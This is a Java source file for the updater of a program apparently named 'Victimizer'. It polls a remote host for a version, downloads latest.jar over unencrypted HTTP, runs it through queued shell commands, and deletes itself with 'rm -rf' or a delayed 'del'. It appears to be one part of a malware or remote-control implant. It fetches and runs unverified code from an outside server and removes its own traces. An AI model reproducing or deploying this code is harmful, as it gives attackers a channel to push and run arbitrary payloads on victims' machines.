package com.crashcourse.victimizer.updater;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

import com.crashcourse.queuecommander.Entry;
import com.crashcourse.queuecommander.QueueCommander;
import com.crashcourse.victimizer.Victimizer;

public class Updater {
	private String FILE_URL = "http://overaitis.com:9090/latest.jar";
	private String FILE_DOWNLOAD_NAME = "latest.jar";
	
	public Updater(String appVersion) {
	}
	public boolean isUpToDate() throws IOException {
		System.out.println("Checking for updates...");
		URL yahoo = new URL("http://overaitis.com:1010/version");
        URLConnection yc = yahoo.openConnection();
        BufferedReader in = new BufferedReader(
                                new InputStreamReader(
                                yc.getInputStream()));
        String inputLine;

        while ((inputLine = in.readLine()) != null) {
        	String input = inputLine;
        	if (input.equalsIgnoreCase(Victimizer.getVersion()) || Victimizer.getVersion().contains("MASTER")) {
        		System.out.println("Software up to date [!!!]");
        		return false;
        	}
        	else {
        		System.out.println("Software update found [!!!]");
        		return true;
        	}
        }
		return false;
	}
	
	//downloads the latest available build from the downloads server
	public void downloadLatestBuild() throws IOException {
		System.out.println("Downloading latest update [...]");
		InputStream in = new URL(FILE_URL).openStream();
		Files.copy(in, Paths.get(FILE_DOWNLOAD_NAME), StandardCopyOption.REPLACE_EXISTING);
		System.out.println("Download Complete [!!!]");

	}
	
	public void deleteSelf() throws IOException {
		System.out.println("Deleting this programs file [!!!]");
		String cmd = null;
		String operatingSystem = System.getProperty("os.name");

	    if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem)) {
	    	cmd = "rm -rf latest.jar";
	    }
	    else if ("Windows".equals(operatingSystem) || "Windows 10".equals(operatingSystem)) {
	    	cmd = "cmd /c ping localhost -n 6 > nul && del latest.jar";
	    }
	    
	    Entry e = new Entry(cmd);
        QueueCommander.addQueue(e);
        while (!e.executed) {
        	System.out.println("Waiting for the queue to process delete...");
        }
	}
	public void runUpdated() throws IOException {
		System.out.println("Running the new program files [!!!]");
        
        String cmd = null;
		String operatingSystem = System.getProperty("os.name");

	    if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem)) {
	    	cmd = "java -jar latest.jar";
	    }
	    else if ("Windows".equals(operatingSystem) || "Windows 10".equals(operatingSystem)) {
	    	cmd = "cmd /c java -jar latest.jar";
	    }
        
	    Entry e = new Entry(cmd);
        QueueCommander.addQueue(e);
        while (!e.executed) {
        	System.out.println("Waiting for the queue to process run...");
        }
	}
}
